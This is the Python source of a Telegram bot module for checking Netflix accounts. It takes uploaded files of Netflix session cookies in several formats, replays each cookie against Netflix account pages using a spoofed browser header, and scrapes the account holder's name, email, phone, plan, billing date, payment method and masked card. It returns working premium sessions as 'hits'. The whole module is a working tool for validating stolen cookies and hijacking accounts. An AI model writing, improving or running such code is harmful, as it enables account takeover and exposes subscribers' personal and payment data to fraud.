# ============================================================
# NETFLIX ACCOUNT CHECKER SERVICE - COMPLETE FIXED
# ============================================================

import os
import re
import json
import zipfile
import tempfile
import requests
from io import BytesIO
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

from telegram import Update, InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ContextTypes, ConversationHandler

from config import E, COOKIES_FOLDER, HITS_FOLDER
from utils import pe, safe_html, clean_unicode, update_bot_stats


# ─── Constants ──────────────────────────────────────────────

WAITING_NETFLIX_FILE = 2  # ← THIS WAS MISSING

NETFLIX_COOKIE_NAMES = {
    "NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent",
    "flwssn", "memclid", "profilesNewSession", "clSharedContext"
}


# ─── Core Functions ─────────────────────────────────────────

def parse_cookie_file_netflix(content: str) -> List[Tuple[str, dict]]:
    text = content.strip()
    results = []

    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                cookie_dict = {k: str(v) for k, v in obj.items() if k in NETFLIX_COOKIE_NAMES}
                if cookie_dict.get('NetflixId'):
                    results.append(("json_block", cookie_dict))
                if "cookies" in obj and isinstance(obj["cookies"], list):
                    merged = {}
                    for cookie in obj["cookies"]:
                        if isinstance(cookie, dict) and "name" in cookie and "value" in cookie:
                            if cookie["name"] in NETFLIX_COOKIE_NAMES:
                                merged[cookie["name"]] = cookie["value"]
                    if merged.get('NetflixId'):
                        results.append(("json_cookies", merged))
            elif isinstance(obj, list):
                merged = {}
                for cookie in obj:
                    if isinstance(cookie, dict):
                        name = cookie.get("name") or cookie.get("key")
                        value = cookie.get("value")
                        if name and value and name in NETFLIX_COOKIE_NAMES:
                            merged[name] = value
                if merged.get('NetflixId'):
                    results.append(("json_list", merged))
    except:
        pass

    netscape_entries = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") and not line.startswith("#HttpOnly_"):
            continue
        if line.startswith("#HttpOnly_"):
            line = line[len("#HttpOnly_"):]
        parts = line.split("\t")
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            if name in NETFLIX_COOKIE_NAMES:
                netscape_entries.append({
                    "name": name, "value": value,
                    "domain": parts[0], "path": parts[2],
                    "secure": parts[3], "expires": parts[4]
                })

    if netscape_entries:
        netflix_ids = [(i, e) for i, e in enumerate(netscape_entries) if e["name"] == "NetflixId"]
        for nf_idx, nf_entry in netflix_ids:
            cookie_set = {"NetflixId": nf_entry["value"]}
            for entry in netscape_entries:
                if entry["name"] != "NetflixId":
                    cookie_set[entry["name"]] = entry["value"]
            results.append((f"netscape_{nf_idx}", cookie_set))
        if not netflix_ids:
            merged = {}
            for e in netscape_entries:
                merged[e["name"]] = e["value"]
            if merged:
                results.append(("netscape_all", merged))

    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        sc = {}
        for part in line.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                k, v = k.strip(), v.strip()
                if k in NETFLIX_COOKIE_NAMES:
                    sc[k] = v
        if sc.get('NetflixId'):
            results.append((f"semicolon_{len(results)}", sc))

    kv = {}
    for line in text.splitlines():
        line = line.strip()
        if "=" in line and not line.startswith("#"):
            k, v = line.split("=", 1)
            k, v = k.strip(), v.strip()
            if k in NETFLIX_COOKIE_NAMES:
                kv[k] = v
    if kv.get('NetflixId'):
        results.append(("keyvalue", kv))

    nf_pattern = r'NetflixId\s*[:=]\s*([^\s;,\n"\']{20,})'
    nf_matches = re.findall(nf_pattern, text, re.IGNORECASE)
    for nf_val in nf_matches:
        nf_val = nf_val.strip('"\'')
        cs = {"NetflixId": nf_val}
        for cn in NETFLIX_COOKIE_NAMES - {"NetflixId"}:
            m = re.search(rf'{cn}\s*[:=]\s*([^\s;,\n"\']+)', text, re.IGNORECASE)
            if m:
                cs[cn] = m.group(1).strip('"\'')
        results.append((f"regex_{len(results)}", cs))

    return results


def check_netflix_cookie(cookie_dict: dict) -> dict:
    if not cookie_dict.get('NetflixId'):
        return {'ok': False, 'reason': 'No NetflixId', 'cookie': cookie_dict}

    session = requests.Session()
    session.cookies.update(cookie_dict)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    try:
        urls = [
            'https://www.netflix.com/YourAccount',
            'https://www.netflix.com/account',
            'https://www.netflix.com/account/membership',
        ]
        resp = None
        txt = ""
        for url in urls:
            try:
                r = session.get(url, headers=headers, timeout=25, allow_redirects=True)
                if r.status_code == 200 and 'Account' in r.text:
                    resp = r
                    txt = r.text
                    break
            except:
                continue

        if not resp or resp.status_code != 200:
            return {'ok': False, 'reason': f'HTTP {resp.status_code if resp else "error"}', 'cookie': cookie_dict}

        if 'login' in resp.url.lower() or 'signin' in resp.url.lower():
            return {'ok': False, 'reason': 'Redirected to login', 'cookie': cookie_dict}

        def find(pattern):
            m = re.search(pattern, txt)
            return safe_html(m.group(1)) if m else None

        name = find(r'"accountOwnerName"\s*:\s*"([^"]+)"') or find(r'"firstName"\s*:\s*"([^"]+)"')
        plan_raw = find(r'localizedPlanName.{1,50}?value":"([^"]+)"') or find(r'"planName"\s*:\s*"([^"]+)"')
        plan = clean_unicode(plan_raw) if plan_raw else None
        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"')
        email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or find(r'"email"\s*:\s*"([^"]+)"')
        member_since = find(r'"memberSince":"([^"]+)"')
        next_billing = find(r'"nextBillingDate":\{[^}]*"date":"([^T"]+)"')
        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"') or find(r'"formattedPlanPrice"\s*:\s*"([^"]+)"')
        payment = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        card = find(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"')
        phone = find(r'"phoneNumberDigits":\{[^}]*"value":"([^"]+)"')
        quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        guid = find(r'"userGuid":\s*"([^"]+)"') or find(r'"ownerGuid"\s*:\s*"([^"]+)"')

        status_match = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        ms = status_match.group(1) if status_match else None

        is_prem = ms == 'CURRENT_MEMBER' if ms else bool(plan and 'free' not in str(plan).lower())

        has_data = any([name, email, country, plan, ms, guid])
        is_valid = has_data and 'Account' in txt

        if not is_valid and not has_data:
            return {'ok': False, 'reason': 'No account data found', 'cookie': cookie_dict}

        profiles = []
        try:
            rp = session.get("https://www.netflix.com/ManageProfiles", timeout=15)
            if rp.status_code == 200:
                profiles = re.findall(r'"profileName"\s*:\s*"([^"]+)"', rp.text)
        except:
            pass
        profiles_str = ", ".join([safe_html(p) for p in profiles]) if profiles else None

        return {
            'ok': True,
            'premium': is_prem,
            'name': name or 'Unknown',
            'country': country or 'Unknown',
            'plan': plan or 'Unknown',
            'plan_price': plan_price or 'Unknown',
            'member_since': member_since or 'Unknown',
            'next_billing': next_billing or 'Unknown',
            'payment_method': payment or 'Unknown',
            'masked_card': card or 'Unknown',
            'phone': phone or 'Unknown',
            'video_quality': quality or 'Unknown',
            'max_streams': streams or 'Unknown',
            'email': email or 'Unknown',
            'profiles': profiles_str or 'Unknown',
            'user_guid': guid or 'Unknown',
            'membership_status': ms or 'Unknown',
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'reason': str(e), 'cookie': cookie_dict}


# ─── Helper Functions ────────────────────────────────────────

def cancel_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['cross'])} Cancel",
            callback_data="main_menu",
            icon_custom_emoji_id=E['cross']
        )]
    ])


def back_button() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"{pe(E['prev'])} Back",
            callback_data="main_menu",
            icon_custom_emoji_id=E['prev']
        )]
    ])


# ─── Handler ─────────────────────────────────────────────────

async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the Netflix account checker conversation."""
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"{pe(E['globe'])} <b>Netflix Account Checker</b>\n\n"
        f"{pe(E['next'])} Upload a <b>.txt</b>, <b>.json</b>, or <b>.zip</b> file\n"
        f"{pe(E['bolt'])} containing Netflix cookies.\n\n"
        f"{pe(E['sparkle'])} I will check each account and show premium hits.",
        reply_markup=cancel_button(),
        parse_mode="HTML"
    )
    return WAITING_NETFLIX_FILE


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle uploaded file and check Netflix cookies."""
    document = update.message.document
    if not document:
        await update.message.reply_html(
            f"{pe(E['cross'])} Please upload a file.",
            reply_markup=cancel_button()
        )
        return WAITING_NETFLIX_FILE

    status_msg = await update.message.reply_html(
        f"{pe(E['loading'])} Processing file..."
    )

    try:
        file = await document.get_file()
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')

        all_cookies = []

        if document.file_name.lower().endswith('.zip'):
            with tempfile.TemporaryDirectory() as td:
                zip_path = os.path.join(td, document.file_name)
                with open(zip_path, 'wb') as f:
                    f.write(content)
                with zipfile.ZipFile(zip_path, 'r') as zf:
                    for name in zf.namelist():
                        if name.endswith('/') or name.startswith('__MACOSX'):
                            continue
                        try:
                            c = zf.read(name).decode('utf-8', errors='ignore')
                            parsed = parse_cookie_file_netflix(c)
                            for _, cd in parsed:
                                if cd.get('NetflixId'):
                                    all_cookies.append(cd)
                        except:
                            pass
        else:
            parsed = parse_cookie_file_netflix(text)
            all_cookies = [cd for _, cd in parsed if cd.get('NetflixId')]

        if not all_cookies:
            await status_msg.edit_text(
                f"{pe(E['cross'])} No valid Netflix cookies found.",
                reply_markup=back_button()
            )
            return ConversationHandler.END

        await status_msg.edit_text(
            f"{pe(E['loading'])} Checking <b>{len(all_cookies)}</b> cookies..."
        )

        hits = []
        free = []
        failed = []

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_netflix_cookie, cd) for cd in all_cookies]
            for future in as_completed(futures):
                result = future.result()
                if result.get('ok'):
                    if result.get('premium'):
                        hits.append(result)
                    else:
                        free.append(result)
                else:
                    failed.append(result)

        if hits:
            buf = BytesIO()
            for i, hit in enumerate(hits, 1):
                buf.write(f"========== HIT #{i} ==========\n".encode())
                for key in ['name', 'email', 'country', 'plan', 'plan_price', 'member_since', 'next_billing', 'payment_method', 'masked_card']:
                    buf.write(f"{key}: {hit.get(key, 'Unknown')}\n".encode())
                buf.write(b"\n")
            buf.seek(0)

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            await status_msg.edit_text(
                f"{pe(E['check'])} <b>Done!</b>\n\n"
                f"{pe(E['gem'])} <b>Premium Hits:</b> {len(hits)}\n"
                f"{pe(E['star'])} <b>Free Accounts:</b> {len(free)}\n"
                f"{pe(E['cross'])} <b>Failed:</b> {len(failed)}\n\n"
                f"{pe(E['bolt'])} Sending results...",
                reply_markup=back_button()
            )

            await update.message.reply_document(
                InputFile(buf, filename=f"netflix_hits_{timestamp}.txt"),
                caption=f"{pe(E['gem'])} {len(hits)} premium hits found!"
            )
            update_bot_stats(True)
        else:
            await status_msg.edit_text(
                f"{pe(E['cross'])} <b>No premium hits found.</b>\n\n"
                f"{pe(E['star'])} Free: {len(free)}\n"
                f"{pe(E['cross'])} Failed: {len(failed)}",
                reply_markup=back_button()
            )
            update_bot_stats(False)

    except Exception as e:
        await status_msg.edit_text(
            f"{pe(E['cross'])} Error: {str(e)[:200]}",
            reply_markup=back_button()
        )
        update_bot_stats(False)

    return ConversationHandler.END